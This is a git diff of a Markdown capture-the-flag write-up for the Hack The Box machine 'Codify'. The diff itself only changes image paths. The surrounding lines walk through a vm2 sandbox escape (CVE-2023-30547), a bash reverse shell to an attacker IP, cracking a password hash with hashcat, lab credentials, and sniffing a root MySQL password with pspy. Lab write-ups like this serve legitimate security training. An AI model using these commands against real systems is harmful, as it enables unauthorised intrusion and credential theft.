@@ -3,7 +3,7 @@ Starting with the IP address I proceed with a Nmap scan to uncover the open port
 ```bash
 nmap -sV -sC 10.129.38.126
 ```
-![Pasted image 20260730140835](Pasted%20image%2020260730140835.png)
+![Pasted image 20260730140835](Images/Pasted%20image%2020260730140835.png)
 - The scan shows that there are 3 ports open for the target:
 	- port 22 holding ssh
 	- port 80 open for http holding a website
@@ -17,15 +17,15 @@ echo "10.129.38.126 codify.htb" | sudo tee -a /etc/hosts
 ### Website
 
 Checking the website I learn that it allows anyone to test a Node.js code in a sandbox environment
-![Pasted image 20260730142239](Pasted%20image%2020260730142239.png)
+![Pasted image 20260730142239](Images/Pasted%20image%2020260730142239.png)
 - Clicking the `Try it now`  button it leads me to a code editor that allows a running node.js code
-![Pasted image 20260730142946](Pasted%20image%2020260730142946.png)
+![Pasted image 20260730142946](Images/Pasted%20image%2020260730142946.png)
 
 Also checking the `About us` page I learn that the website uses the `vm2` library for sandboxing JavaScript, so it means that all the code runs through a `vm2` sandbox environment
-![Pasted image 20260730143447](Pasted%20image%2020260730143447.png)
+![Pasted image 20260730143447](Images/Pasted%20image%2020260730143447.png)
 
 Clicking the `vm2` text it redirects to a github page that shows me the `3.9.16`version for the library
-![Pasted image 20260730143702](Pasted%20image%2020260730143702.png)
+![Pasted image 20260730143702](Images/Pasted%20image%2020260730143702.png)
 
 With a quick search on Google I found that the version for the `vm2` library is vulnerable to the [CVE-2023-30547](https://nvd.nist.gov/vuln/detail/cve-2023-30547) which leads to remote code execution
 
@@ -51,22 +51,22 @@ try {
 }
 ```
 
-Checking if the script works I pass the command `id` and it returns with the id of the `svc` user:![Pasted image 20260730145406](Pasted%20image%2020260730145406.png)
+Checking if the script works I pass the command `id` and it returns with the id of the `svc` user:![Pasted image 20260730145406](Images/Pasted%20image%2020260730145406.png)
 
 So now all I have to do is to pass a code that will give me a reverse shell on the target:
 ```bash
 /bin/bash -c \'/bin/bash -i >& /dev/tcp/10.10.16.53/4444 0>&1\'
 ```
 - I used `\'` instead of a simple quote because I don't want to be interpreted as part of the JavaScript code 
-![Pasted image 20260730145644](Pasted%20image%2020260730145644.png)
+![Pasted image 20260730145644](Images/Pasted%20image%2020260730145644.png)
 - I started a listener with netcat: `nc -lvnp 4444` and it gave me access to the target
-![Pasted image 20260730145717](Pasted%20image%2020260730145717.png)
+![Pasted image 20260730145717](Images/Pasted%20image%2020260730145717.png)
 
 ### Foothold 
 
 The `svc` user is placed in the `/home` directory but it does not contain anything useful so I surely have to find another user:
 - Checking the `/home` directory shows another user `joshua` which is the next target
-![Pasted image 20260730145931](Pasted%20image%2020260730145931.png)
+![Pasted image 20260730145931](Images/Pasted%20image%2020260730145931.png)
 
 Now that I have a new target I need to find a way to gain access to that account either by exploiting something or by finding the account's password
 
@@ -74,11 +74,11 @@ One way to search for a password is to find a database present either on a servi
 ```bash
 find / -name "*.db" -type f -readable 2>/dev/null
 ```
-![Pasted image 20260730150343](Pasted%20image%2020260730150343.png)
+![Pasted image 20260730150343](Images/Pasted%20image%2020260730150343.png)
 - The output shows 4 database files related to some libraries but the first result is located at `/var/www/contact/tickets.db` which is an unusual place and it may leak some credentials 
 
 Reading the file I got exactly what I wanted: a password hash for the `joshua` user
-![Pasted image 20260730150618](Pasted%20image%2020260730150618.png)
+![Pasted image 20260730150618](Images/Pasted%20image%2020260730150618.png)
 - now what is left is to crack the hash using `hashcat` 
 
 - First I put the hash into a file:
@@ -90,19 +90,19 @@ echo '<found_hash>' > hash
 hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt --show
 ```
 - The cracked password being `spongebob1`:
-![Pasted image 20260730150924](Pasted%20image%2020260730150924.png)
+![Pasted image 20260730150924](Images/Pasted%20image%2020260730150924.png)
 
 Using the credentials from below I attempted to connect through `ssh`, being a success and the user `joshua` was holding the user flag as I suspected
 - username: `joshua`
 - password: `spongebob1`
-![Pasted image 20260730151153](Pasted%20image%2020260730151153.png)
+![Pasted image 20260730151153](Images/Pasted%20image%2020260730151153.png)
 
 # System Flag
 
 Next on the list is to retrieve the system flag, but I have to find a way inside the `root` account
 
 It was not very hard to find a way, because when the command `sudo -l` showed me that there is a script found at `/opt/scripts/mysql-backup.sh` that can be run with `root` permissions
-![Pasted image 20260730152439](Pasted%20image%2020260730152439.png)
+![Pasted image 20260730152439](Images/Pasted%20image%2020260730152439.png)
 
 The script is used to backup a mysql database inside a backup directory using the mysql `root` account
 ```bash
@@ -145,7 +145,7 @@ One particular thing about the script is how the mysql password of the `root` ac
 But to gain actually something from this script, I observed that later the script calls the `mysqldump` where as an argument the actual password DB_PASS is being passed so with a tool like `pspy` we can sniff the command and get the actual password of the `root` mysql account 
 
 So to prove that this works I ran the script and used for the MySQL password for root the value: `*` and the script executed successfully
-![Pasted image 20260730164517](Pasted%20image%2020260730164517.png)
+![Pasted image 20260730164517](Images/Pasted%20image%2020260730164517.png)
 - There was even a message from the `mysqldump` command which advise me to not use a password on the command line interface, proving that my theory to sniff the password with `pspy` must be correct
 
 Now I start a new ssh connection to the `joshua` user and transfer the `pspy` tool onto the target machine using a python web server
@@ -165,7 +165,7 @@ chmod +x ./pspy64 && ./pspy64
 sudo /opt/scripts/mysql-backup.sh
 Enter MySQL password for root: *
 ```
-![Pasted image 20260730165255](Pasted%20image%2020260730165255.png)
+![Pasted image 20260730165255](Images/Pasted%20image%2020260730165255.png)
 - Everything worked and I got a hold on the root MySQL password:
 	- `kljh12k3jhaskjh12kjh3`
 
@@ -173,5 +173,5 @@ Having this password a good check is to see if I can ssh into the root account b
 
 Another good check before trying something else is to if I can use `su root` with the found password
 - Thankfully worked, giving me full access and allowing me to find the system flag
-![Pasted image 20260730165800](Pasted%20image%2020260730165800.png)
+![Pasted image 20260730165800](Images/Pasted%20image%2020260730165800.png)
 
